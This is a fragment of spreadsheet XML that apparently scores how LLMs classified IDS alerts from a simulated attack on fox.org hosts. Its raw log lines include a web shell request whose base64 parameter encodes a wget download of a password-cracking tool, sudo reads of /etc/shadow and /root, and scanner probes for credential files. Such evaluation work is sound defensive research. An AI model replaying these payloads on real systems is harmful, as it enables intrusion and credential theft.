          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">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Web Content Discovery,</text:p>
            <text:p>Directory Traversal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/js/admin/~adm HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters and 404 http cod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Information Gathering, </text:p>
            <text:p>Attempted Access to Sensitive Files,</text:p>
            <text:p>Web Server Misconfiguration Exploitation</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ttempted access to sensitive files and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Information Gathering, </text:p>
            <text:p>Web Attack: Directory Traversal / Path Traversal</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ttempted access to sensitive files and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Web Attack: File Enumeration</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ttempted access to common php config file</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Web Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell,</text:p>
            <text:p>Remote Code Execution,</text:p>
            <text:p>SQL Injection,</text:p>
            <text:p>Download Cradle</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in payload and keywords like wp_meta, mysql, wget in decoded base64 payload</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Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Remote Code Execution,</text:p>
            <text:p>Credential Access</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in payload and keywords like wphashcrack, rockyou in decoded base64 payload</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Attack: Brute Force,</text:p>
            <text:p>Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”,</text:p>
            <text:p>Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on frequency of apache access request</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Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Resource Hijacking,</text:p>
            <text:p>Denial of Service,</text:p>
            <text:p>System Compromise</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abnormal CPU valu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connaissance, </text:p>
            <text:p>Command and Control</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probably based on tool name dnsmasq, unusual frequency of DNS query Ips</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reverse Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Command and Control,</text:p>
            <text:p>Exploitation for Client Execution</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 </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">Classification probably </text:span>based on high entropy in base64 encoded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Account Manipulation</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text:span text:style-name="T4">Classification probably </text:span>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Lateral Movement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “intranet-server su[28816]: + /dev/pts/1 www-data:phopkins”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">Classification probably </text:span>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 </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation,</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text:span text:style-name="T4">Classification probably </text:span>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cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”</text:p>
            <text:p>Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">Classification probably </text:span>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text:span text:style-name="T4">Classification probably </text:span>based on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46])" office:value-type="float" office:value="94" calcext:value-type="float">
            <text:p>94</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_wazuh_gemini_run4" table:style-name="ta1">
        <table:table-column table:style-name="co51" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co52" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co27" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co53" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co54" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1" table:number-columns-repeated="2"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Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”, “SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol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TLS Protocol Anomaly,</text:p>
            <text:p>Network Scan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”, </text:p>
            <text:p>Raw Data: “SURICATA TLS invalid record/traffic [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol TLS and rule frequenc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TLS Protocol Anomaly, </text:p>
            <text:p>Network Scan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol TLS</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Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scan, </text:p>
            <text:p>SSH Brute Force / Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan).”, mitre – technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”,</text:p>
            <text:p>Raw Data: “webserver sshd[25473]: Did not receive identification string from [IP] port [port]</text:p>
            <text:p>Raw Data: “internal-share sshd[28182]: Did not receive identification string from [IP] port [port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name sshd and IDS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sshd: insecure connection attempt (scan).”, mitre – technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”</text:p>
            <text:p>Raw Data: “webserver sshd[25473]: Did not receive identification string from [IP] port [port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name sshd and IDS classification</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Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 403 http code and access to forbidden content</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 </text:p>
            <text:p>Exploitation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “First time this IDS alert is generated.”,</text:p>
            <text:p>Raw Data: “SURICATA SMTP invalid reply [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol SMTP</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tool name apache and access attempt for forbidden files</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Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nsml)”, “POST /sdk HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name nmap and 403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Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Apache: Attempt to access forbidden file or directory.”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/nmaplowercheck1642508249”</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7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/change-wp-admin-login/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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”,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Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/regenerate-thumbnails-advanced/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and http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ning,</text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “HEAD /wp-config.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404 http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Vulnerability Scanning, </text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,  </text:p>
            <text:p>Raw Data: “GET /academics HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 404 http code responses from same sourc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Vulnerability Scanning,  </text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “GET /accountants HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 404 http code responses and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Vulnerability Scanning,</text:p>
            <text:p>Web Content Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”,</text:p>
            <text:p>Raw Data: “GET /bea HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 404 http code and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7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning,</text:p>
            <text:p>Web Content Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /beheer HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 404 http code responses from same source I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ttempted Access to Forbidden Files/Directories,</text:p>
            <text:p>Information Gathering</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access attempt to sensitives file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Vulnerability Scanning, </text:p>
            <text:p>Web Content Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/skins/wordpress/ibm HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 404 http code responses and IDS mitre classific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Network Protocol Anomaly, </text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA HTTP unable to match response to request”</text:p>
            <text:p>Raw Data: “SURICATA HTTP unable to match response to request [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol http</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8" calcext:value-type="float">
            <text:p>8</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>TLS Anomaly, </text:p>
            <text:p>Network Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”, “SURICATA TLS invalid record/traffic”</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid record/traffic [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol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Password Guessing, </text:p>
            <text:p>Brute Force</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failed PAM authentication attempt</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ext:p>Persistence,</text:p>
            <text:p>Initial Access</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mitre IDS classification, too generic because all classifications are used</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation, </text:p>
            <text:p>Defense Evasion,</text:p>
            <text:p>Persistence,</text:p>
            <text:p>Initial Access</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mitre IDS classification, too generic because all classifications are used</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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Successful sudo to ROOT executed.”, mitre – technqi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mitre IDS classification, a little generic as the IDS classification was just used</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 </text:p>
            <text:p>Discovery</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ls -laR /root/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on mitre IDS classification and tool name sudo, classification is quite generic</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">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 </text:p>
            <text:p>Credential Access</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cat /etc/shadow”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on mitre IDS classification and tool name sudo, classification is quite generic</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B29])" office:value-type="float" office:value="72" calcext:value-type="float">
            <text:p>72</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_aminer_chatgpt_run5" table:style-name="ta1">
        <table:table-column table:style-name="co1" table:number-columns-repeated="2" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co55" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co56" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co4" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co29" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co57"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Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of query records in DNS logs.”, “Frequency anomaly detected”,</text:p>
            <text:p>Raw Data: “dnsmasq[14522]: query[A] mail.price.fox.org from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on low frequency of A record queries</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Brute Force,</text:p>
            <text:p>Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=&lt;&gt;, rip=192.168.130.77, lip=192.168.128.195, session=&lt;hifuP9rVVNbAqIJN&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IMAP login without authentication attempt</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Network Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “no host name found for IP address [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on reverse DNS looku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7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Discovery,</text:p>
            <text:p>Unauthorized Access Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”, </text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to root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Encrypted Channel Misuse,</text:p>
            <text:p>Network Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”, </text:p>
            <text:p>Raw Data: “TLS error on connection from [192.168.130.77] (gnutls_handshake): An unexpected TLS packet was received.”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and unexpected TLS packet sent (indicating scanning behavio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4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</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Server Fingerprinting</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 403, tool name apache and attempted access to /</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ning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362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Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/analytics-for-w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7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Scanning,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/animated-typing-effect/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attempted access to plugin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Web Application Scanning,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/themes/ecobiz/thumb/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attempted access to them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eb Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/themes/eCobiz/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attempted access to them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text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “GET /javascript/jquery/.htpasswd HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to credentials file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Web Application Scanning</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Discovery,</text:p>
            <text:p>Initial Access</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info.php </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irectory Traversal,</text:p>
            <text:p>Web Application Scanning</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directory without a default index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Control Evasion</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ttempted access to hidden file indicating scanning</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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 301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pplication Discovery,</text:p>
            <text:p>Information Disclosure</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Classification probably based on attempted access to phpinfo.php which might include environment inform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pplication Discovery,</text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/index.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to non-existent php file in them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Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected” </text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/includes/classes/lost+found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File / Directory Enumeration</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ttempted access to non-existent php file in theme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Reconnaissance,</text:p>
            <text:p>Environment Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to phpinfo.php which might include environment informa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Attempt to Restricted Resource</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempt to access plugin folder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File / Directory Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs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Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/info.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to sensitive .php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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found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 </text:p>
            <text:p>Credential Access</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attempted access to wp themes and http status code 403</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Reconnaissance,</text:p>
            <text:p>Defense Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/social/.hta HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to hidden file in wp themes folder</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Credential Access</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attempt to access hidden credentials file in wp theme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Reconnaissance, </text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/js/admin/~adm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Defense Evasion,</text:p>
            <text:p>Credential Access</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ttempted access to hidden file in wp theme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Information Disclosure Attempt</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ttempted access to hidden credentials file in wp themes folde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File / Directory Enumeration</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ttempted access to sensitive .php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Web Shell Upload, </text:p>
            <text:p>Command and Control (C2)</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because of base64 encoded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eb Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Data Exfiltration, </text:p>
            <text:p>Common and Control (C2)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 200 506717 - python-requests/2.27.1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload</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Shell Activity, </text:p>
            <text:p>Command and Control (C2)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,</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because of base64 encoded payload; payload however was not decoded to identify indicators of password cracking attack</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Automated Access / Account Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”</text:p>
